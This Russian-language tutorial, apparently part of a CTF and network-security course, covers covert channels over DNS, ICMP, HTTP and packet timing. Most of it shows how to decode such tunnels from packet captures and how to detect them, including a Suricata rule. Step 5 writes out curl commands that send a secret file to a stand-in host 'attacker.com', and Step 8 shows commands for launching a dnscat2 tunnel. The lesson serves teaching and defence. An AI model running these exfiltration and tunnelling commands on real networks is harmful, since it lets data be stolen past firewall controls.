## Вопрос, с которого всё начинается

В сети стоит строгий фаервол: наружу разрешены только DNS, ICMP и HTTPS. Казалось бы, данные не вынести. Но что, если спрятать их **внутри** разрешённого протокола — закодировать в поддомены DNS-запросов или в payload ping? Тогда для фильтра это обычный DNS, а на самом деле — канал передачи данных.

Это называется **скрытый канал** (covert channel). В CTF так прячут флаг, в пентесте — вытаскивают данные и строят C2. Разберём, как его строят и как находить.

Этот урок опирается на [`network-tcpip`](network-tcpip) и [`network-tcpdump`](network-tcpdump).

## Наш пример: странный DNS-трафик

Дан дамп с подозрительным DNS. Считаем, к каким зонам больше всего запросов:

```
$ tshark -r capture.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name \
  | awk -F. '{print $(NF-2)"."$(NF-1)"."$NF}' | sort | uniq -c | sort -rn | head
   4821 t.example.com
     12 example.com
```

Одна зона — `t.example.com` — собрала почти все запросы. Это подозрительно: нормальный клиент не делает 4821 запрос к одному домену. Смотрим сами имена:

```
$ tshark -r capture.pcap -Y 'dns.qry.name contains "t.example.com"' \
  -T fields -e dns.qry.name | head -3
MFRGGZDFMZTWQ2LK.t.example.com
MFRGGZDFMZTWQ2LL.t.example.com
```

Длинные случайные поддомены. Разберём, что это.

## Шаг 1: виды скрытых каналов

| Канал | Носитель | Пропускная способность | Заметность |
|---|---|---|---|
| **DNS** | поддомены, TXT, типы записей | низкая | низкая |
| **ICMP** | payload ping, type/code | средняя | средняя |
| **HTTP** | заголовки, cookie, тело | высокая | низкая (сливается с вебом) |
| **Тайминги** | интервалы между пакетами | очень низкая | очень низкая |

Чем «обычнее» носитель, тем незаметнее канал: HTTP на 443 не блокируют, а DNS почти всегда разрешён наружу. Но помни главное: **чем незаметнее, тем медленнее**.

## Шаг 2: как кодируют данные в DNS

Данные бьют на куски и кодируют, затем добавляют как поддомен:

```text
MFRGGZDFMZTWQ2LK.tunnel.attacker.com   →  байты, декодированные сервером
```

Почему **base32**, а не base64? Имя DNS чувствительно к символам: base64 содержит `+`, `/` и `=`, которые ломают имя. Base32 использует только `A-Z2-7` — безопасно для меток. Base64 годится для TXT-записей.

```
$ echo -n "hello" | base32
NBSWY3DP
```

## Шаг 3: декодируем туннель

Собираем левые метки **в порядке времени** и декодируем:

```
$ tshark -r capture.pcap -Y 'dns.qry.name contains "t.example.com"' \
  -T fields -e dns.qry.name | cut -d. -f1 | tr -d '\n' | base32 -d
...secret data exfiltrated...
```

Если данные шли в ответах (TXT), берём их иначе:

```
$ tshark -r capture.pcap -Y 'dns.txt' -T fields -e dns.txt | tr -d '\n' | base64 -d
```

Конвейер `tshark -T fields` → `cut` → `base32/base64 -d` решает большинство DNS-туннельных CTF-задач. Если результат «мусорный» — попробуй другую кодировку или XOR: поверх кодировки часто лежит ещё и шифрование.

## Шаг 4: ICMP-туннель

Ping разрешён почти везде, а payload Echo Request можно заполнить данными. Обычный ping payload **пуст** — ищем непустой:

```
$ tshark -r capture.pcap -Y 'icmp.type==8 && data.len>0' -T fields -e data | head
536563726574
$ python3 -c "print(bytes.fromhex('536563726574').decode())"
Secret
```

Склеиваем payload всех echo-request по порядку и декодируем — типичный приём.

## Шаг 5: HTTP-инкапсуляция

Самый «сливающийся» канал: данные прячут в заголовках, cookie или теле POST:

```
$ curl -s -H "Cookie: sess=$(base64 -w0 secret.txt)" https://attacker.com/x
$ curl -s "https://attacker.com/$(xxd -p secret.bin | head -c 100)"
```

Детект — по необычным заголовкам (cookie без сессии), повторяющемуся User-Agent, beacon-интервалу.

## Шаг 6: обнаружение и защита

- **Статистика объёма**: сколько байт уходит на конкретный домен за период.
- **Энтропия имён**: случайные строки в поддоменах — признак кодирования.
- **Типы записей**: крупные TXT, NULL, частые CNAME.
- **ICMP payload**: наличие данных, нестандартные размеры.
- **Beacon-паттерны**: регулярные интервалы, одинаковые размеры.

Защита: разрешать DNS только к внутренним резолверам, DPI с энтропийным анализом, ограничение размера ICMP, профилирование beacon-трафика, сегментация.

## Шаг 7: полный разбор одной задачи

Соберём всё на сквозном примере. Дан `tunnel.pcap`; подозреваем DNS-туннель.

**1. Находим подозрительный домен.** Считаем частоту по «родительским» зонам:

```
$ tshark -r tunnel.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name \
  | awk -F. '{print $(NF-2)"."$(NF-1)"."$NF}' | sort | uniq -c | sort -rn | head -2
   3204 c2.badzone.net
      9  example.com
```

**2. Проверяем энтропию метки.** У обычного домена метка — слово; у туннеля — случайная строка:

```
$ tshark -r tunnel.pcap -Y 'dns.qry.name contains "c2.badzone.net"' \
  -T fields -e dns.qry.name | head -2 | cut -d. -f1
JBSWY3DPEB3W64TMMQ
JBSWY3DPEB3W64TMMR
```

Метки длинные, похожи на base32 и идут по порядку — верный признак.

**3. Собираем и декодируем.**

```
$ tshark -r tunnel.pcap -Y 'dns.qry.name contains "c2.badzone.net"' \
  -T fields -e dns.qry.name | cut -d. -f1 | tr -d '\n' | base32 -d
flag{dns_exfil_is_easy}
```

**4. Если мусор** — данные могли быть зашифрованы XOR до кодирования. Тогда перебирают однобайтовый XOR по всем 256 ключам и смотрят, где появится читаемый текст.

Этот конвейер — «найти зону → проверить энтропию → собрать → декодировать» — решает почти любую CTF-задачу на скрытый канал.

## Шаг 8: как устроен настоящий DNS-туннель

CTF-дамп — упрощение. Реальный инструмент (например, `dnscat2` или `iodine`) решает те же задачи, но аккуратнее, и его устройство объясняет, что искать в трафике.

Каналу нужно четыре вещи:

- **Разбиение на блоки** — данные режутся на куски, каждый кладётся в одну метку (метка ограничена 63 символами).
- **Нумерация** — в поддомен добавляют счётчик (`1.t.attacker.com`, `2.t.attacker.com`), иначе на приёме не восстановить порядок.
- **Подтверждение** — сервер отвечает, и клиент шлёт следующий блок; отсюда «пила» запрос-ответ.
- **Кодировка** — обычно base32 или hex; base64 ломает имя символами `+/=`.

Отсюда два наблюдаемых признака: **длина метки близка к максимуму** и **высокая энтропия символов**. Запуск сервера в лаборатории выглядит так:

```
$ ./dnscat2-server t.example.com
$ ./dnscat2 t.example.com
```

Клиент и сервер обмениваются запросами типов `TXT` и `CNAME` — их в дампе и видно.

## Шаг 9: детект на практике

Статистика глазами — одно, правило в IDS — другое. Простой детектор аномально длинной DNS-метки в Suricata:

```yaml
alert dns $HOME_NET any -> any 53 (msg:"Possible DNS tunnel - long label";
  dns.query; pcre:"/^[a-z2-7]{40,}\./i"; sid:1000010; rev:1;)
```

Правило срабатывает, когда метка запроса состоит из 40+ символов base32-алфавита — так выглядит кусок туннеля. Дополнительно считают **энтропию** имени: у `www` она низкая, у случайной строки — высокая. Порог по энтропии плюс объём запросов к одной зоне дают устойчивый детект без ложных срабатываний на легитимный CDN-трафик.

## Тайминговый канал: когда содержимое не меняется вовсе

Самый незаметный канал не прячет данные в байтах — он кодирует их **интервалами**: «пауза 100 мс = 0, пауза 300 мс = 1». Содержимое пакетов при этом абсолютно нормальное, поэтому DPI и сигнатуры бессильны — смотреть надо на **время между пакетами**.

Идея на уровне понятий: отправитель шлёт пустые пакеты с заданными задержками, приёмник мерит интервалы и восстанавливает биты.

```
$ tshark -r timing.pcap -T fields -e frame.time_delta_displayed | head
0.101
0.298
0.102
```

Чередование ~0.1 и ~0.3 с выдаёт два символа. Пропускная способность измеряется битами в секунду и очень низка, зато детект требует статистики по времени, а не по содержимому. Защита — джиттер-буферизация и выравнивание таймингов на границе, что для интерактивных протоколов часто неприемлемо.

## Почему это всё ещё работает

Фаервол по умолчанию разрешает то, без чего сеть не живёт: DNS для резолвинга, ICMP для диагностики, 443 для веба. Запретить их полностью нельзя — сломается всё. Скрытый канал эксплуатирует именно эту необходимость: он **не нарушает политику, а прячется внутри неё**. Отсюда вывод для защиты — не «закрыть протокол», а **профилировать его**: кто, куда и с какой регулярностью ходит.

## Что мы теперь знаем

- Скрытый канал прячет сам факт передачи, маскируясь под легитимный протокол.
- DNS-туннель кодирует данные в поддомены (обычно base32) и собирается обратно.
- ICMP-туннель прячет данные в payload ping; обычный ping payload пуст.
- HTTP — самый «сливающийся», но легко профилируется по beacon-интервалу.
- Детект — по объёму, энтропии имён, типам записей и регулярности.
- Тайминговые каналы кодируют данные паузами, а не байтами, и ловятся только статистикой времени.

## Куда дальше

Мы разобрали, как прятать данные в разрешённых протоколах. Это завершает вводную ветку сети — дальше идут более узкие темы: конкретные протоколы, туннели и атаки на них. А пока запомни: **«разрешённый протокол» не значит «безопасный» — любой канал можно превратить в транспорт для данных.**

## Где пригодится

- **CTF:** извлечение данных из странного трафика.
- **Пентест:** эксфильтрация через разрешённые каналы.
- **SOC:** детект туннелирования и DGA.
- **Сетевая защита:** политика egress и нормализация.
